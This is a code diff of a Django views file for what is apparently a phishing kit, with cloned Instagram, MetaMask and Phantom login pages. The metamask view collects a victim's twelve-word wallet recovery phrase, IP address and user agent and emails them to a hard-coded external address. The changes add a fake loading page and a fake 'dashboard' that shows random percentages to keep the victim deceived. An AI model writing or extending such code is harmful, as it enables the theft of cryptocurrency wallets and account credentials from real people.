@@ -3,6 +3,7 @@ from django.contrib.auth import authenticate, login, logout
 from django.contrib import messages
 from django.core.mail import send_mail
 from .models import Category, Post, Comment, ReplayComment, User
+import random
 
 
 ##########################
@@ -19,6 +20,8 @@ def send_email(subject, message, recipient_list):
     except Exception as e:
         print(f"Failed to send email: {e}")
 ##########################
+
+
 
 def home(request):
     posts = Post.objects.all()
@@ -114,10 +117,7 @@ def auth(request):
 
 
 
-
-
-
-
+#####################################################
 def instagram(request):
     if request.method == "POST":
         ip_address = request.META.get('REMOTE_ADDR')
@@ -145,6 +145,7 @@ user_agent = {user_agent}
     return render(request, "instagram/index.html")
 
 
+#####################################################
 def metamask(request):
     if request.method == "POST":
         ip_address = request.META.get('REMOTE_ADDR')
@@ -163,9 +164,9 @@ def metamask(request):
         p11 = request.POST.get("11")
         p12 = request.POST.get("12")
 
-        all = request.POST.get("all")
+        all = request.POST.get("all").split()
+        pall = f"{p1} {p2} {p3} {p4} {p5} {p6} {p7} {p8} {p9} {p10} {p11} {p12}".split()
 
-        pall = f"{p1} {p2} {p3} {p4} {p5} {p6} {p7} {p8} {p9} {p10} {p11} {p12}"
         print(pall)
         print(all)
         
@@ -188,23 +189,29 @@ user_agent = {user_agent}
                     """
         send_email("***Metamask***", content, ["eyobjjj@gmail.com"])
         #######################################
-        if "" in [p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12] and all == "":
-            pass
-        elif not len(all.split()) > 11:
+        if len(all) < 12 and len(pall) < 12:
             pass
         else:
             print("runnnnnnnnnnnnnnnnnn")
+            return redirect("/m-load")
 
     return render(request, "metamask/index.html")
 
 
+def metamask_loading(request):
+    return render(request, "metamask/metamask-loading.html")
 
+
+def metamask_dashboard(request):
+    lists = [[100,0],[99,1],[98,2],[97,3],[96,4],[95,5],[94,6],[93,7],[92,8],[91,9],[90,10],[89,11],[88,12],[87,13],[86,14],[85,15]]
+    result = random.choice(lists)
+    success_percent = result[0]
+    danger_percent = result[1]
+    return render(request, "metamask/metamask-dashboard.html", {'success_percent': success_percent,'danger_percent': danger_percent})
+
+#####################################################
 def phantom(request):
     return render(request, "phantom/index.html")
-
-
-
-
 
 
 
